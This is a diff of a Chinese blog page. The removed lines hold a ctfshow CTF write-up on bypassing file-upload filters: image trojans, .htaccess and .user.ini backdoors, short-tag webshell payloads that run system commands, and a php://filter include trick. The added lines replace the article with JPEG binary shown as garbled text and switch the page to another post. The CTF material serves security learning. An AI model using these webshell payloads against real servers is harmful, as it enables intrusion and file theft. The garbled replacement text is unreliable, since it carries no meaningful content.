@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传, 幻影旅团">
-    <meta name="description" content="ctfshow的文件上传的wp">
+    <meta name="keywords" content="幻影旅团">
+    <meta name="description" content="����JFIF��C
+%# , #&amp;amp;’)*)-0-(0%()(��C
+(((((((((((((((((((((((((((">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传 | 幻影旅团</title>
+    <title>幻影旅团</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -259,12 +261,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -378,25 +380,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                <span class="chip bg-color">文件上传</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/ctfshow/" class="post-category">
-                                ctfshow
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -405,21 +394,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-22
+                    2022-03-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    387
                 </div>
                 
 
@@ -444,81 +433,9 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>1.前端校验</p>
-<p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p>
-<h2 id="2-htaccess-和-user-ini-配置文件妙用"><a href="#2-htaccess-和-user-ini-配置文件妙用" class="headerlink" title="2.htaccess 和.user.ini 配置文件妙用"></a>2.htaccess 和.user.ini 配置文件妙用</h2><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf 中有这样一条配置：</p>
-<pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>这条配置的意思就是将.php、.phtml 文件后缀的文件当做 php 文件执行，如果开启了这条配置，就可以上传.phtml 文件在执行 php 代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php 文件后缀。</p>
-<p>或者这条配置：</p>
-<pre class="line-numbers language-none"><code class="language-none">SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>将所有文件都解析为 php 文件。</p>
-<p>通常全局文件我们都是不可更改的，而 Apache 还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的 web 目录起作用，例如：我们在 www 目录下有一个.htaccess 配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将 jpg 文件当做 PHP 文件解析。这样就可以直接解析 jpg 后缀的 webshell。</p>
-<pre class="line-numbers language-none"><code class="language-none">// .htaccessAddType application/x-httpd-php.jpg
-// 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>访问 1.jpg，当做 PHP 解析。</p>
-<p>局限：.htaccess 配置文件只在 Apache 服务器中起作用。</p>
-<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><pre class="line-numbers language-none"><code class="language-none">// .user.ini
-auto_prepend_file = 1.jpg
-
-// 1.jpg
-&lt;?php phpinfo();?&gt;
-
-// 1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>也就是在一个目录下有.user.ini 这个配置文件，配置内容为上，有 1.jpg，同时该目录下还需要有.php 后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 1.php 文件头插入了 <code>require('1.jpg')</code> 这条语句，也就是说相当于文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p>
-<p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。</p>
-<p>局限：在.user.ini 中使用这条配置需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。</p>
-<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。</p>
-<p>注意：传入的时候可能内容会被ban 需要各种过滤</p>
-<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>3.<strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
-<p> 可以加GIF89a图片头进行欺骗</p>
-<p>也可以  1.png /b +2.php 3.png</p>
-<h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><p>上传图片马，然后在burpsuie里把后缀png更改为php，再去执行命令即可，制作图片马方法</p>
-<pre class="line-numbers language-none"><code class="language-none">用一张小点的图片和一句话木马，利用copy命令生成图片马
-copy 1.png/b+2.php/a 3.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>同上</p>
-<h2 id="web-153"><a href="#web-153" class="headerlink" title="web 153"></a>web 153</h2><p>开始对php后缀进行了限制，这里我们利用<code>.user.ini</code>来构造后门</p>
-<blockquote>
-<p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>
-</blockquote>
-<pre class="line-numbers language-none"><code class="language-none">//.user.ini
-auto_prepend_file=1.png
-
-//1.png
-&lt;?php phpinfo();?&gt;
-
-//1.php(任意php文件)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句<code>require('1.png')</code>，进行了文件包含，所以我们就依次上传即可</p>
-<h2 id="web-154"><a href="#web-154" class="headerlink" title="web 154"></a>web 154</h2><p>继续按照上题步骤，传一个<code>.user.ini</code>文件，接着在上传图片马的时候报错了</p>
-<p>解码后显示的文字是不支持格式，说明可能内容里的php被ban了，改成短标签的形式再上传，发现可以通过</p>
-<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web-155"><a href="#web-155" class="headerlink" title="web 155"></a>web 155</h2><p>同上</p>
-<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>同上</p>
-<h2 id="web-157"><a href="#web-157" class="headerlink" title="web 157"></a>web 157</h2><p>一样用上题(web154)的办法可以通过，但过滤了分号，把短标签后面的<code>;</code>去掉，即</p>
-<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=system("tac ../f*")?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同上</p>
-<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>这里把()给ban了，我们采用反引号来执行命令，即</p>
-<pre class="line-numbers language-none"><code class="language-none">短标签形式：&lt;?=`tac ../f*`?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web-160"><a href="#web-160" class="headerlink" title="web 160"></a>web 160</h2><p>依旧上传个<code>.user.ini</code>文件，但在传图片马的时候把反引号给ban了，我们使用include命令去配合php伪协议进行读取，因为把php给ban了，所以我们需要拼接起来，即</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>这次上传失败了，尝试在头部加了图片文件头，就过去了，所以这里应该是用了getimagesize()进行检测</p>
-<blockquote>
-<p><strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
-</blockquote>
-<p>所以在上题的基础上都加个GIF89a图片头就可以了</p>
+                <p>����JFIF��C<br></p>
+<p>%# , #&amp;’)*)-0-(0%()(��C<br><br></p>
+<p>(((((((((((((((((((((((((((((((((((((((((((((((((((����”����L        !1”AQa2q�#BR�37r��$%����’4btu���CESUs��������5!A1�Qa�RST���Bqr�$c�����?�R��I�5�x}bcR�]�[��ķ<br>�xܟI&lt;g�j�������?p�”u�l�C�!)bJ�A-��Nl�b5�C�yl�mm:��!i)RO��Z�ۭ�杼�WϞ���3��J|�E+�+&gt;�+�x�Di(�t���꩷ر�mЌF[��,���H��{T�%�<em>A��ɋS��g�n�극.����Oc�W�����<code>:��"���ؔ����R�r�n�Dq��c���jbJy8���g?�</code>��F��ת�)����k�’����ǥi�$�p�����l�j=Eo�EZP�ǒ�Z�’=�!�W����ꚻØ�4���o�}��c�J�sm)D�){76) ��9��]�å����ޜ�H�6�V��ia�������NG�</em>ho�y��Y��$-�F��g��ժ��r�戋<del>�?�-Q”0�0��eJ�<br>���=�9�Z�Ҷ=jnn�z�$ʗ”4fm�!�b�QV{�</del>�����k���%�D�2I��s�<del>�� �����ۑ��K�8��=��ëe�8�)Z��G”��2$�O�fGv;�P�<br>�j��J��W&amp;3̡��l��HZ</del>FG#���)պ�m䴶����n)    @Oҽ�<br>R�EnӱV���T*Vw��w�0?J<br>b�mzr�v�_�Zg�<code>(��� ZA�@�Ȩ��l�&gt;[WK�֫�KN)�����ލԮ��U���g۸�%�HZ����'� n��.nx��r�5M.���ׅec9�5�S��h�/Hbԩn    GN��ǰ��A�R�'�2gHL����T���J��q��=@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)@�)A�x4�lx�aq��ix���$B��ڗMWm�e�g�V��G�����=w^�r����l�Z�����!�eo�}a��@�Z�</code>*f%��Wr�͎ۮ��7�+=���<del>�o�D��pu��P���jK}��}f�3�o8�{�+n�Z��`���ث��%�!��.��Ҧ�rT��7w�\�i۱�ɵ��8^��RW��jF.��2�"ا?<br>���q��nG�9”���vT�%IvC�+yՕ�G��NI�f�4�f��ǴÑuR���c�N?u��ݞw+?�k�$�0G���-3޴ȹ���㸖�}#)B��A&gt;٠^n��3.�1�r���&gt;�W�=x�a�ºA)b:�Q�d=����j��d�Qaȗƙ��v:�8qE$��A�Nn�7�164�-V)�.U�.N��s�$!! ��<br>ǌ�ԍ�Wi�@�?�,2ݿ��ߋ04��Jv�Ť���@88��”lId�&lt;�a�੷RR�����k&amp;]�lK&lt;���0��İ�������r9&gt;⇊m�\|�$GجFd����������늓��h�CT=Qh�&amp;33�<br>Q$��l:��iD��$�s�G?5��V�sXj�5��̢:JP�,6IK-!!(@’���%R�iT���u�8�����HZޟ�%.4G��c�&gt;��Z����4;t[���l��}m˘�N��#q��*�ݴ\�3vr#ɶ��a�&gt;�,���X��Hȶ�=�]���n�����,d��G|��D)</del>$0’�btLZ�m����TJ���z��ǽjT�Ğ�ᨮBǻ�!b6�s��v���5U�T$��U��Ɏ��í6�w�����s�����PcҔ�R�r;.�}�Xmn&lt;���J&lt;���U�o�����Sn����C$pAƼP1T�6y����6�[�i��J��n��#��*:�JR�JUh)JR�JR�JR�U�Hݬ�m(��ͥdt�g%[�VpN���Uj��R����W��[u���+<br>��, �<br>*�}���:0�j)P�pA���*�<br>�gO�̷�    �l�ۚϘ`�</p>
 
                 
             </div>
@@ -535,7 +452,7 @@ auto_prepend_file=1.png
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">吹</a>
+                    <a href="/about" rel="external nofollow noreferrer">D4marvel</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -545,7 +462,7 @@ auto_prepend_file=1.png
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://54Wa1234.github.io/2022/01/22/ctfshow-wen-jian-shang-chuan/">http://54Wa1234.github.io/2022/01/22/ctfshow-wen-jian-shang-chuan/</a>
+                    <a href="http://54Wa1234.github.io/2022/03/21/wu-shu-zi-zi-mu-rce/apache-luan-ma-wen-ti/">http://54Wa1234.github.io/2022/03/21/wu-shu-zi-zi-mu-rce/apache-luan-ma-wen-ti/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -558,7 +475,7 @@ auto_prepend_file=1.png
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">吹</a>
+                    <a href="/about" target="_blank">D4marvel</a>
                     !
                 </span>
             </div>
@@ -582,11 +499,7 @@ auto_prepend_file=1.png
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                    <span class="chip bg-color">文件上传</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -758,49 +671,39 @@ auto_prepend_file=1.png
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/22/tu-pian-yin-xie-zong-jie/">
+                <a href="/2022/03/21/wu-shu-zi-zi-mu-rce/apache-luan-ma-wen-ti/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="图片隐写">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">图片隐写</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            图片隐写总结
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/misc/" class="post-category">
-                                    misc
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            D4marvel
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">
-                        <span class="chip bg-color">图片隐写</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -811,31 +714,30 @@ auto_prepend_file=1.png
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/22/ctfshow-wen-jian-bao-han/">
+                <a href="/2022/03/21/wu-shu-zi-zi-mu-rce/">
                     <div class="card-image">
                         
+                        <img src="/images/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce.jpg" class="responsive-img" alt="无数字字母rce">
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="文件包含">
-                        
-                        <span class="card-title">文件包含</span>
+                        <span class="card-title">无数字字母rce</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow的文件包含的wp
+                            无数字字母构造webshell
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctfshow/" class="post-category">
-                                    ctfshow
+                            <a href="/categories/webshell/" class="post-category">
+                                    webshell
                                 </a>
                             
                             
@@ -845,8 +747,8 @@ auto_prepend_file=1.png
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                        <span class="chip bg-color">文件包含</span>
+                    <a href="/tags/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">
+                        <span class="chip bg-color">无数字字母rce</span>
                     </a>
                     
                 </div>
